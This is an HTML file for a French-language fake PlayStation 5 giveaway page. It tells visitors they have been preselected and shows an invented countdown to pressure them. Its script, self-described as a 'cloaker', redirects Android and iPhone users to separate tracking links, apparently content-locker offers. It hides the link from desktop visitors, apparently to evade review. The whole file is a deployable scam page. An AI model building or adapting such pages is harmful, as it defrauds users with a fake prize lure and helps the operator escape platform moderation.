<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gagnez votre PlayStation 5 !</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #00439c; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background-color: white; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.2); text-align: center; max-width: 420px; padding: 30px; border: 1px solid #ddd; }
        h1 { color: #1c1e21; margin-bottom: 10px; font-size: 26px; font-weight: 700; }
        p { color: #606770; font-size: 17px; margin-bottom: 25px; line-height: 1.5; }
        .ps5-img { max-width: 80%; margin-bottom: 20px; }
        .cta-button { display: block; width: 100%; box-sizing: border-box; padding: 16px; font-size: 18px; font-weight: bold; color: white; background-color: #0070d1; border: none; border-radius: 8px; cursor: pointer; text-decoration: none; transition: background-color 0.3s; }
        .cta-button:hover { background-color: #005eb8; }
        .timer { font-size: 18px; font-weight: bold; color: #d93025; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/PlayStation_5_logo_and_wordmark.svg" alt="PlayStation 5" class="ps5-img">
        
        <h1>Félicitations !</h1>
        <p>Vous avez été présélectionné pour recevoir la nouvelle <strong>PlayStation 5</strong>. Terminez la dernière étape pour confirmer votre participation au tirage au sort officiel.</p>
        <a href="#" class="cta-button" id="cta-link">CONFIRMER MA PARTICIPATION</a>
        <div class="timer">Attention : cette offre expire dans <span id="countdown">04:37</span></div>
    </div>

    <script>
        // --- PARTIE 1 : LE COMPTE À REBOURS ---
        let duration = 4 * 60 + 37;
        const countdownElement = document.getElementById('countdown');
        const interval = setInterval(function () {
            if (duration < 0) { clearInterval(interval); return; }
            let minutes = parseInt(duration / 60, 10);
            let seconds = parseInt(duration % 60, 10);
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;
            countdownElement.textContent = minutes + ":" + seconds;
            duration--;
        }, 1000);

        // --- PARTIE 2 : LE CLOAKER INTELLIGENT ---
        document.addEventListener('DOMContentLoaded', function() {
            // --- LES MUNITIONS SONT ICI ---
            const lienAndroid = "https://singingfiles.com/show.php?l=0&u=2407130&id=68676";
            const lienIphone = "https://singingfiles.com/show.php?l=0&u=2407130&id=68677";
            
            const ctaLink = document.getElementById('cta-link');
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;

            if (/android/i.test(userAgent)) {
                ctaLink.href = lienAndroid;
            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                ctaLink.href = lienIphone;
            } else {
                ctaLink.innerText = 'Offre disponible sur mobile uniquement';
                ctaLink.style.backgroundColor = '#a0a0a0';
                ctaLink.style.cursor = 'not-allowed';
                ctaLink.removeAttribute('href');
            }
        });
    </script>
</body>
</html>
